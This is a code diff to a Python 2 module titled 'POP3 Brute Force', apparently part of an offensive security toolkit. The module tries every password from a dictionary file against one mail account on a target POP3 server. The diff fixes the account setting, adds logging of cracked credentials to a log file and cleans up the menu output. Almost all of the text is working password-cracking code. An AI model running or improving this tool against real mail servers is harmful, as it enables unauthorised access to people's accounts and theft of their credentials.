@@ -2,7 +2,9 @@
 # POP3 Brute Force
 # Script by RedToor
 # 22/05/2015
+
 from core import help
+import time
 import poplib
 W  = '\033[0m'  
 R  = '\033[31m' 
@@ -14,23 +16,26 @@ C  = '\033[36m'
 GR = '\033[37m'
 defaulthost="localhost"
 defaultport="110"
-#defaultdic1="core/db/user.dicc"
-defaultaccount="webmaster@target.com"
+defaultaccount="admin@target.con"
 defaultdic2="core/db/pass.dicc"
 def btpop3():
 	try:
-		global defaulthost,defaultport,defaultdic1,defaultdic2
-		actions = raw_input(B+"   bt/pop3 > "+W)
+		global defaulthost,defaultport,defaultdic1,defaultdic2,defaultaccount
+		actions = raw_input(O+"     ktn/bt/pop3 > "+W)
 		if actions == "show options":
+			print ""
 			print "     ["+R+"+"+W+"] options"
-			print "     target         : yes"
-			print "     port           : no/yes"
-			print "     dictionaries   : no/yes\n"
+			print "     |target         : yes"
+			print "     |port           : no/yes"
+			print "     |account        : yes"
+			print "     |dictionaries   : no/yes\n"
+			print ""
 			print "     ["+G+"+"+W+"] options current"
-			print "     target         : ",defaulthost
-			print "     port           : ",defaultport
-			print "     account        : ",defaultaccount
-			print "     dictionary     : ",defaultdic2
+			print "     |target         : ",defaulthost
+			print "     |port           : ",defaultport
+			print "     |account        : ",defaultaccount
+			print "     |dictionary     : ",defaultdic2
+			print ""
 			btpop3()
 		elif actions[0:10] == "set target":
 			defaulthost = actions[11:]
@@ -46,19 +51,17 @@ def btpop3():
 				print "     dictionary     : "+defaultdic2+" "+O+"     Saved!!!"+W
 				btpop3()
 		elif actions[0:11] == "set account":
-				defaultdic2 = actions[17:]
+				defaultaccount = actions[12:]
 				print "     account        : "+defaultaccount+" "+O+"     Saved!!!"+W
 				btpop3()
-
 		elif actions=="back":
-			pass 
+			return 
 		elif actions=="exit":
-			print C+"   GooD"+W+" bye."
+			print C+"     GooD"+W+" bye."
 			exit()
 		elif actions == "help":
 			help.help()
-
-		if actions == "run":
+		elif actions == "run":
 			print("\n     ["+O+"!"+W+"] Checking file")
 			if True:
 				if True:
@@ -67,7 +70,7 @@ def btpop3():
 					print "     port           : ",defaultport
 					print "     account        : ",defaultaccount
 					print "     dictionary     : ",defaultdic2
-					print 
+					print ""
 					try:
 						red=poplib.POP3(defaulthost, defaultport)
 						if True:
@@ -81,17 +84,27 @@ def btpop3():
 											red.user(defaultaccount)
 											red.pass_(ps)
 											if True:
-												print "     ["+G+"+"+W+"] SUCCESSFUL with username : "+defaultaccount+" , password : "+ps+"\n"
-												return
-
+												log=open('core/logs/logsBruteForce.log','a')
+												log.write('\n ===================================== ')
+												log.write('\n Module  : BruteForcePOP3')
+												log.write('\n Data    : '+time.strftime('%c'))
+												log.write('\n target  : '+defaulthost)
+												log.write('\n port    : '+defaultport)
+												log.write('\n account : '+defaultaccount)
+												log.write('\n Cracked : username : '+defaultaccount+' , password : '+ps)
+												log.close()
+												print "     ["+G+"+"+W+"] Successfully with username : "+defaultaccount+" , password : "+ps+"\n"
+												return 1
 										except(KeyboardInterrupt, SystemExit):
-											print("   ["+O+"!"+W+"] (Ctrl + C) Detected, System Exit")
+											print("     ["+O+"!"+W+"] (Ctrl + C) Detected, System Exit")
 										except:
 											print "     ["+O+"!"+W+"] Checking with username : "+defaultaccount+" , password : "+ps						
 							except(KeyboardInterrupt, SystemExit):
-								print("   ["+O+"!"+W+"] (Ctrl + C) Detected, System Exit")
+								print("     ["+O+"!"+W+"] (Ctrl + C) Detected, System Exit")
 					except:
-						print("     ["+R+"-"+W+"] target DEAD")
+						print("     ["+R+"-"+W+"] target off")
+		else:
+			print "     ["+O+"!"+W+"] command No Accept"+W
 	except(KeyboardInterrupt, SystemExit):
 		print("   ["+O+"!"+W+"] (Ctrl + C) Detected, System Exit")
 	btpop3()
